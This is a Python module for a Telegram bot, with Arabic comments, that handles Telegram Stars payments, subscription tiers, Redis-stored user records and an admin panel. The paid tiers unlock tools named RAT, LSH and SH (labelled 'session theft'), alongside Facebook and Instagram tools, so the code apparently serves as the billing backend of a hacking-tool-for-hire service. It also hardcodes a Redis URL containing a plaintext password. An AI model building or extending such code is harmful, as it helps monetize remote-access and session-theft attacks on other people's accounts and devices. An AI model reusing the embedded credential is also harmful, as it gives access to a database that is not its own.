# stars_payment.py
# نظام الدفع بنجوم تلجرام + نظام الأدمن الكامل

import os
import json
import time
import redis
from datetime import datetime, timedelta
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    LabeledPrice, PreCheckoutQuery
)

# ============================================================
# [1] الإعدادات العامة
# ============================================================
PRICING_PLANS = {
    "basic": {
        "name": "الباقة الأساسية",
        "stars": 50,
        "days": 30,
        "daily_limit": 20,
        "features": ["فيسبوك", "انستقرام", "QR Code"]
    },
    "pro": {
        "name": "الباقة الاحترافية",
        "stars": 150,
        "days": 30,
        "daily_limit": 100,
        "features": ["فيسبوك", "انستقرام", "QR Code", "RAT", "LSH", "SH"]
    },
    "vip": {
        "name": "باقة VIP",
        "stars": 400,
        "days": 90,
        "daily_limit": 999999,
        "features": ["كل الأدوات بدون قيود"]
    },
}

FREE_TRIAL_USES = 1
AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh"]

# ============================================================
# ★★★ قائمة الأدمن — ضع chat_id الخاص بك هنا ★★★
# ============================================================
ADMIN_IDS = [
    7631249810,  # ← ضع chat_id الخاص بك
]

# قائمة VIP — مستخدمون بلا حدود (يمنحهم الأدمن)
VIP_IDS = [
    7631249810,
]


# ============================================================
# [2] Redis
# ============================================================
REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379").strip()
if REDIS_URL.startswith("redis-cli"):
    REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"

try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True, socket_timeout=5)
    redis_client.ping()
    print("[+] stars_payment: Redis connected")
except Exception as e:
    print(f"[-] Redis error in stars_payment: {e}")
    redis_client = None


# ============================================================
# [3] التحقق من الأدمن
# ============================================================
def is_admin(user_id):
    """هل المستخدم أدمن؟"""
    return int(user_id) in ADMIN_IDS


def is_vip(user_id):
    """هل المستخدم VIP؟"""
    if int(user_id) in ADMIN_IDS:
        return True
    if int(user_id) in VIP_IDS:
        return True
    return False


def require_admin(func):
    """Decorator — للتحقق من الأدمن"""
    def wrapper(*args, **kwargs):
        # في telegram callbacks، args[0] = call
        first = args[0] if args else None
        user_id = None
        if first is not None:
            if hasattr(first, 'from_user'):
                user_id = first.from_user.id
            elif hasattr(first, 'message'):
                user_id = first.message.chat.id
        if user_id and is_admin(user_id):
            return func(*args, **kwargs)
        print(f"[-] Unauthorized admin attempt by {user_id}")
    return wrapper


# ============================================================
# [4] إدارة المستخدمين
# ============================================================
def _user_key(user_id):
    return f"user:{user_id}"


def get_user(user_id):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(_user_key(user_id))
        if raw:
            return json.loads(raw)
    except Exception as e:
        print(f"[-] get_user error: {e}")
    return None


def save_user(user_id, data):
    if not redis_client:
        return False
    try:
        redis_client.set(_user_key(user_id), json.dumps(data))
        return True
    except Exception as e:
        print(f"[-] save_user error: {e}")
        return False


def create_new_user(user_id, username="Unknown", first_name="User"):
    user = {
        "user_id": user_id,
        "username": username,
        "first_name": first_name,
        "created_at": datetime.utcnow().isoformat(),
        "trial_uses": {tool: FREE_TRIAL_USES for tool in AVAILABLE_TOOLS},
        "subscription": None,
        "total_stars_spent": 0,
        "purchases": [],
        "daily_reset_date": datetime.utcnow().strftime("%Y-%m-%d"),
        "daily_uses_count": 0,
        "is_banned": False,
        "is_vip": False,
        "notes": "",
    }
    save_user(user_id, user)
    # سجل المستخدم في مجموعة
    if redis_client:
        try:
            redis_client.sadd("all_users", str(user_id))
        except Exception:
            pass
    return user


def get_or_create_user(user_id, username="Unknown", first_name="User"):
    user = get_user(user_id)
    if not user:
        user = create_new_user(user_id, username, first_name)
    # تحديثات إضافية
    if "trial_uses" not in user:
        user["trial_uses"] = {tool: FREE_TRIAL_USES for tool in AVAILABLE_TOOLS}
    for tool in AVAILABLE_TOOLS:
        user["trial_uses"].setdefault(tool, FREE_TRIAL_USES)
    if "daily_reset_date" not in user:
        user["daily_reset_date"] = datetime.utcnow().strftime("%Y-%m-%d")
        user["daily_uses_count"] = 0
    if "is_banned" not in user:
        user["is_banned"] = False
    if "is_vip" not in user:
        user["is_vip"] = False
    if "notes" not in user:
        user["notes"] = ""
    return user


def get_all_users():
    """يرجع قائمة كل المستخدمين"""
    if not redis_client:
        return []
    try:
        user_ids = redis_client.smembers("all_users")
        users = []
        for uid in (user_ids or []):
            u = get_user(uid)
            if u:
                users.append(u)
        return users
    except Exception as e:
        print(f"[-] get_all_users error: {e}")
        return []


def delete_user(user_id):
    """يحذف مستخدم تماماً"""
    if not redis_client:
        return False
    try:
        redis_client.delete(_user_key(user_id))
        redis_client.srem("all_users", str(user_id))
        return True
    except Exception as e:
        print(f"[-] delete_user error: {e}")
        return False


def ban_user(user_id):
    """يحظر مستخدم"""
    user = get_or_create_user(user_id)
    user["is_banned"] = True
    return save_user(user_id, user)


def unban_user(user_id):
    """يفك حظر مستخدم"""
    user = get_or_create_user(user_id)
    user["is_banned"] = False
    return save_user(user_id, user)


def _today_key():
    return datetime.utcnow().strftime("%Y-%m-%d")


def _reset_daily_counter_if_needed(user):
    today = _today_key()
    if user.get("daily_reset_date") != today:
        user["daily_reset_date"] = today
        user["daily_uses_count"] = 0
    return user


# ============================================================
# [5] التحقق من الصلاحيات — VIP لا نهائي
# ============================================================
def check_subscription_active(user):
    sub = user.get("subscription")
    if not sub:
        return False
    try:
        expires_at = datetime.fromisoformat(sub["expires_at"])
        return datetime.utcnow() < expires_at
    except Exception:
        return False


def can_use_tool(user_id, tool):
    user = get_or_create_user(user_id)
    user = _reset_daily_counter_if_needed(user)
    
    # 🚫 محظور؟
    if user.get("is_banned"):
        return {"allowed": False, "reason": "banned"}
    
    # 👑 الأدمن دائماً مسموح
    if is_admin(user_id):
        return {"allowed": True, "reason": "admin", "unlimited": True}
    
    # 💎 VIP ممنوح من الأدمن
    if user.get("is_vip") or is_vip(user_id):
        return {"allowed": True, "reason": "vip", "unlimited": True}
    
    # 🎁 الاستخدام المجاني
    trial = user.get("trial_uses", {})
    if trial.get(tool, 0) > 0:
        return {"allowed": True, "reason": "free_trial", "remaining_free": trial[tool]}
    
    # 📅 الاشتراك
    if check_subscription_active(user):
        plan_key = user["subscription"]["plan"]
        plan = PRICING_PLANS.get(plan_key, {})
        daily_limit = plan.get("daily_limit", 0)
        used_today = user.get("daily_uses_count", 0)
        if used_today < daily_limit:
            return {"allowed": True, "reason": "subscription",
                    "remaining_today": daily_limit - used_today}
        return {"allowed": False, "reason": "daily_limit_reached", "daily_limit": daily_limit}
    
    return {"allowed": False, "reason": "no_credit", "remaining_free": 0}


def consume_usage(user_id, tool):
    user = get_or_create_user(user_id)
    user = _reset_daily_counter_if_needed(user)
    
    # الأدمن و VIP لا يستهلكون
    if is_admin(user_id) or user.get("is_vip") or is_vip(user_id):
        return True
    
    # الاستخدام المجاني
    trial = user.get("trial_uses", {})
    if trial.get(tool, 0) > 0:
        trial[tool] -= 1
        user["trial_uses"] = trial
        save_user(user_id, user)
        return True
    
    # الاشتراك
    if check_subscription_active(user):
        user["daily_uses_count"] = user.get("daily_uses_count", 0) + 1
        save_user(user_id, user)
        return True
    return False


# ============================================================
# [6] لوحات الباقات
# ============================================================
def build_plans_keyboard():
    markup = InlineKeyboardMarkup()
    for key, plan in PRICING_PLANS.items():
        text = f"⭐ {plan['stars']} نجمة — {plan['name']} ({plan['days']} يوم)"
        markup.add(InlineKeyboardButton(text, callback_data=f"buy_plan_{key}"))
    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup


def build_main_payment_keyboard():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("💎 عرض الباقات المتاحة", callback_data="show_plans"))
    markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup


def build_plans_text():
    lines = ["💎 **الباقات المتاحة:**\n━━━━━━━━━━━━━━━━━━"]
    for key, plan in PRICING_PLANS.items():
        lines.append(
            f"\n🔹 **{plan['name']}**\n"
            f"   ⭐ السعر: {plan['stars']} نجمة\n"
            f"   📅 المدة: {plan['days']} يوم\n"
            f"   🎯 الحد اليومي: {plan['daily_limit']} عملية\n"
            f"   ✨ الميزات: {', '.join(plan['features'])}"
        )
    lines.append("\n━━━━━━━━━━━━━━━━━━\nاختر الباقة المناسبة من الأزرار أدناه 👇")
    return "\n".join(lines)


def build_account_text(user_id):
    user = get_or_create_user(user_id)
    user = _reset_daily_counter_if_needed(user)

    trial = user.get("trial_uses", {})
    tool_names = {
        "fb": "فيسبوك", "ig": "انستقرام", "qr": "QR Code",
        "rat": "RAT", "lsh": "LSH", "sh": "سرقة الجلسات",
    }

    trial_lines = []
    for tool, count in trial.items():
        trial_lines.append(f"  • {tool_names.get(tool, tool)}: {count} متبقية")
    trial_text = "\n".join(trial_lines) if trial_lines else "  لا يوجد"

    # حالة الحساب
    status = ""
    if is_admin(user_id):
        status = "👑 **أدمن** — كل شيء مفتوح (لا نهائي)"
    elif user.get("is_banned"):
        status = "🚫 **محظور** — لا يمكنك استخدام البوت"
    elif user.get("is_vip") or is_vip(user_id):
        status = "💎 **VIP** — كل شيء بدون حدود"
    elif check_subscription_active(user):
        plan_key = user["subscription"]["plan"]
        plan = PRICING_PLANS.get(plan_key, {})
        expires = datetime.fromisoformat(user["subscription"]["expires_at"])
        remaining_days = (expires - datetime.utcnow()).days
        used_today = user.get("daily_uses_count", 0)
        status = (
            f"✅ **{plan['name']}**\n"
            f"  📅 متبقي: {remaining_days} يوم\n"
            f"  🎯 استخدام اليوم: {used_today}/{plan['daily_limit']}"
        )
    else:
        status = "❌ لا يوجد اشتراك نشط"

    return (
        f"👤 **حسابك الشخصي**\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🆔 الآيدي: `{user_id}`\n"
        f"👋 الاسم: {user.get('first_name', 'Unknown')}\n\n"
        f"📊 **حالتك:**\n{status}\n\n"
        f"🎁 **الاستخدام المجاني المتبقي:**\n{trial_text}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💰 إجمالي النجوم المصروفة: {user.get('total_stars_spent', 0)}⭐"
    )


# ============================================================
# [7] الفاتورة والدفع
# ============================================================
def send_invoice(bot, chat_id, plan_key):
    plan = PRICING_PLANS.get(plan_key)
    if not plan:
        bot.send_message(chat_id, "❌ الباقة غير موجودة.")
        return

    payload = f"sub|{plan_key}|{chat_id}|{int(time.time())}"

    try:
        bot.send_invoice(
            chat_id=chat_id,
            title=plan["name"],
            description=f"اشتراك {plan['days']} يوم | حد يومي {plan['daily_limit']} عملية",
            invoice_payload=payload,
            provider_token="",
            currency="XTR",
            prices=[LabeledPrice(label=plan["name"], amount=plan["stars"])],
            start_parameter=f"sub-{plan_key}",
            need_name=False,
            need_phone_number=False,
            need_email=False,
            need_shipping_address=False,
            is_flexible=False,
        )
        print(f"[+] Invoice sent: {chat_id} -> {plan_key}")
    except Exception as e:
        print(f"[-] send_invoice error: {e}")


def activate_subscription(user_id, plan_key):
    user = get_or_create_user(user_id)
    plan = PRICING_PLANS[plan_key]

    now = datetime.utcnow()
    if check_subscription_active(user):
        current_expiry = datetime.fromisoformat(user["subscription"]["expires_at"])
        start_from = max(current_expiry, now)
    else:
        start_from = now

    new_expiry = start_from + timedelta(days=plan["days"])

    user["subscription"] = {
        "plan": plan_key,
        "started_at": now.isoformat(),
        "expires_at": new_expiry.isoformat(),
        "stars_paid": plan["stars"]
    }
    user["total_stars_spent"] = user.get("total_stars_spent", 0) + plan["stars"]
    user["purchases"] = user.get("purchases", [])
    user["purchases"].append({
        "plan": plan_key,
        "stars": plan["stars"],
        "date": now.isoformat()
    })
    save_user(user_id, user)
    return user


# ============================================================
# [8] تسجيل معالجات الدفع + معالجات الأدمن
# ============================================================
def register_payment_handlers(bot):

    @bot.pre_checkout_query_handler(func=lambda q: True)
    def pre_checkout(pre_checkout_q: PreCheckoutQuery):
        try:
            bot.answer_pre_checkout_query(pre_checkout_q.id, ok=True)
            print(f"[+] Pre-checkout OK: {pre_checkout_q.from_user.id}")
        except Exception as e:
            print(f"[-] pre_checkout error: {e}")

    @bot.message_handler(content_types=['successful_payment'])
    def successful_payment(message):
        try:
            payload = message.successful_payment.invoice_payload
            parts = payload.split("|")
            if len(parts) < 3:
                return

            plan_key = parts[1]
            try:
                user_id = int(parts[2])
            except Exception:
                user_id = message.from_user.id

            if message.from_user.id != user_id:
                user_id = message.from_user.id

            user = activate_subscription(user_id, plan_key)
            plan = PRICING_PLANS.get(plan_key)
            if not plan:
                return

            expires = datetime.fromisoformat(user["subscription"]["expires_at"])
            expires_str = expires.strftime("%Y-%m-%d %H:%M UTC")

            bot.send_message(
                user_id,
                f"✅ **تم تفعيل اشتراكك بنجاح!**\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"💎 الباقة: {plan['name']}\n"
                f"⭐ النجوم المدفوعة: {plan['stars']}\n"
                f"📅 ينتهي في: `{expires_str}`\n"
                f"🎯 الحد اليومي: {plan['daily_limit']} عملية\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"استمتع بكل الميزات! 🚀",
                parse_mode="Markdown"
            )
            print(f"[+] Subscription activated: user={user_id}, plan={plan_key}")

        except Exception as e:
            print(f"[-] successful_payment error: {e}")
            import traceback
            traceback.print_exc()


# ============================================================
# [9] ★★★ دوال الأدمن ★★★
# ============================================================
def build_admin_menu():
    """لوحة الأدمن الرئيسية"""
    m = InlineKeyboardMarkup()
    m.row(
        InlineKeyboardButton("👥 قائمة المستخدمين", callback_data="admin_users_0"),
    )
    m.row(
        InlineKeyboardButton("➕ إضافة مستخدم لباقة", callback_data="admin_add_sub"),
        InlineKeyboardButton("💎 منح VIP", callback_data="admin_grant_vip"),
    )
    m.row(
        InlineKeyboardButton("🚫 حظر مستخدم", callback_data="admin_ban"),
        InlineKeyboardButton("✅ فك حظر", callback_data="admin_unban"),
    )
    m.row(
        InlineKeyboardButton("🗑️ حذف مستخدم", callback_data="admin_delete"),
        InlineKeyboardButton("🔍 بحث", callback_data="admin_search"),
    )
    m.row(
        InlineKeyboardButton("📊 إحصائيات", callback_data="admin_stats"),
        InlineKeyboardButton("📢 رسالة جماعية", callback_data="admin_broadcast"),
    )
    m.row(
        InlineKeyboardButton("⭐ إعطاء نجوم", callback_data="admin_give_stars"),
        InlineKeyboardButton("📋 آخر المسجلين", callback_data="admin_recent"),
    )
    m.row(
        InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"),
    )
    return m


def build_admin_users_keyboard(users, page=0, per_page=10):
    """قائمة المستخدمين مع pagination"""
    m = InlineKeyboardMarkup()
    
    start = page * per_page
    end = start + per_page
    page_users = users[start:end]
    
    for u in page_users:
        uid = u.get("user_id")
        name = (u.get("first_name") or u.get("username") or "Unknown")[:20]
        
        # أيقونة الحالة
        if is_admin(uid):
            icon = "👑"
        elif u.get("is_banned"):
            icon = "🚫"
        elif u.get("is_vip"):
            icon = "💎"
        elif check_subscription_active(u):
            icon = "✅"
        else:
            icon = "👤"
        
        m.row(
            InlineKeyboardButton(f"{icon} {name} | {uid}", callback_data=f"admin_user_{uid}")
        )
    
    # Pagination
    nav_buttons = []
    total_pages = (len(users) + per_page - 1) // per_page
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ السابق", callback_data=f"admin_users_{page-1}"))
    nav_buttons.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("التالي ➡️", callback_data=f"admin_users_{page+1}"))
    
    if nav_buttons:
        m.row(*nav_buttons)
    
    m.row(InlineKeyboardButton("🔙 رجوع للأدمن", callback_data="admin_panel"))
    return m


def build_user_detail_keyboard(uid, user):
    """لوحة تحكم بمستخدم واحد"""
    m = InlineKeyboardMarkup()
    
    if user.get("is_banned"):
        m.row(InlineKeyboardButton("✅ فك الحظر", callback_data=f"admin_unban_user_{uid}"))
    else:
        m.row(InlineKeyboardButton("🚫 حظر", callback_data=f"admin_ban_user_{uid}"))
    
    if user.get("is_vip"):
        m.row(InlineKeyboardButton("❌ إزالة VIP", callback_data=f"admin_remove_vip_{uid}"))
    else:
        m.row(InlineKeyboardButton("💎 منح VIP", callback_data=f"admin_grant_vip_user_{uid}"))
    
    m.row(
        InlineKeyboardButton("📅 إعطاء اشتراك", callback_data=f"admin_give_sub_{uid}"),
        InlineKeyboardButton("⭐ إعطاء نجوم", callback_data=f"admin_give_stars_{uid}"),
    )
    m.row(
        InlineKeyboardButton("🗑️ حذف نهائي", callback_data=f"admin_delete_user_{uid}"),
    )
    m.row(
        InlineKeyboardButton("📨 رسالة له", callback_data=f"admin_msg_user_{uid}"),
        InlineKeyboardButton("🔙 رجوع", callback_data="admin_users_0"),
    )
    return m


def build_user_info_text(uid, user):
    """نص معلومات المستخدم"""
    # الحالة
    if is_admin(uid):
        status = "👑 أدمن"
    elif user.get("is_banned"):
        status = "🚫 محظور"
    elif user.get("is_vip"):
        status = "💎 VIP"
    elif check_subscription_active(user):
        plan_key = user["subscription"]["plan"]
        plan = PRICING_PLANS.get(plan_key, {})
        expires = datetime.fromisoformat(user["subscription"]["expires_at"])
        days_left = (expires - datetime.utcnow()).days
        status = f"✅ {plan['name']} ({days_left} يوم متبقي)"
    else:
        status = "👤 مجاني"
    
    # التواريخ
    created = user.get("created_at", "")[:19].replace("T", " ")
    
    # عدد الاستخدامات
    total_uses = 0
    for tool, count in user.get("trial_uses", {}).items():
        total_uses += (FREE_TRIAL_USES - count)
    
    # الاشتراكات
    purchases = user.get("purchases", [])
    total_spent = user.get("total_stars_spent", 0)
    
    # آخر استخدام
    daily_uses = user.get("daily_uses_count", 0)
    
    return (
        f"👤 **معلومات المستخدم**\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🆔 `{uid}`\n"
        f"👋 الاسم: {user.get('first_name', 'Unknown')}\n"
        f"📝 Username: @{user.get('username', 'N/A')}\n\n"
        f"📊 **الحالة:** {status}\n"
        f"📅 **التسجيل:** `{created}`\n"
        f"🎯 **استخدام اليوم:** `{daily_uses}`\n"
        f"⭐ **إجمالي المصروف:** `{total_spent}` نجمة\n"
        f"🛍️ **عدد المشتريات:** `{len(purchases)}`\n\n"
        f"🎁 **الاستخدام المجاني:**\n"
        f"• فيسبوك: `{user.get('trial_uses', {}).get('fb', 0)}`\n"
        f"• انستقرام: `{user.get('trial_uses', {}).get('ig', 0)}`\n"
        f"• QR: `{user.get('trial_uses', {}).get('qr', 0)}`\n"
        f"• RAT: `{user.get('trial_uses', {}).get('rat', 0)}`\n"
        f"• LSH: `{user.get('trial_uses', {}).get('lsh', 0)}`\n"
        f"• SH: `{user.get('trial_uses', {}).get('sh', 0)}`\n\n"
        f"📝 **ملاحظات:** `{user.get('notes', 'لا يوجد')}`"
    )


def build_admin_stats_text():
    """إحصائيات شاملة"""
    users = get_all_users()
    
    total_users = len(users)
    banned = sum(1 for u in users if u.get("is_banned"))
    vips = sum(1 for u in users if u.get("is_vip"))
    subscribed = sum(1 for u in users if check_subscription_active(u))
    
    total_stars = sum(u.get("total_stars_spent", 0) for u in users)
    total_purchases = sum(len(u.get("purchases", [])) for u in users)
    
    # آخر 24 ساعة
    now = time.time()
    recent = sum(1 for u in users 
                 if u.get("created_at") and 
                 (now - datetime.fromisoformat(u["created_at"]).timestamp()) < 86400)
    
    return (
        f"📊 **إحصائيات النظام**\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 **إجمالي المستخدمين:** `{total_users}`\n"
        f"✅ **المشتركين النشطين:** `{subscribed}`\n"
        f"💎 **VIP:** `{vips}`\n"
        f"🚫 **المحظورين:** `{banned}`\n"
        f"🆕 **آخر 24 ساعة:** `{recent}`\n\n"
        f"💰 **إجمالي النجوم:** `{total_stars}` ⭐\n"
        f"🛍️ **إجمالي المشتريات:** `{total_purchases}`\n\n"
        f"👑 **الأدمن:** `{len(ADMIN_IDS)}`\n"
        f"━━━━━━━━━━━━━━━━━━"
)
